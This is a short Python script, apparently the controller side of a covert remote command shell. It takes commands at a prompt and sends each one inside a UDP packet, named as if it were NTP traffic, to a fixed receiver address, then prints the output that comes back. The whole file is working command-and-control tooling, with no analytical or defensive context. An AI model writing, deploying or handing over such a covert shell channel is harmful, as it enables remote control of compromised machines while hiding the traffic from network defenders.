import socket
from scapy.all import IP, UDP, Raw, send

receiver_ip = "192.168.10.25"
receiver_port = 12345

sender_ip = "192.168.10.50"
sender_port = 54321

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((sender_ip, sender_port))

print(f"Interactive command shell started. Type 'exit' to quit.")

while True:
    
    command = input("Command> ").strip()
    if command.lower() == "exit":
        print("Exiting...")
        break

    ntp_packet = (
        IP(dst=receiver_ip) /
        UDP(sport=sender_port, dport=receiver_port) /
        Raw(load=command.encode())
    )
    
    send(ntp_packet)
    print(f"Sent: {command}. Waiting for response...\n")

    data, addr = sock.recvfrom(4096)
    print(f"Response:\n{data.decode('utf-8')}\n")
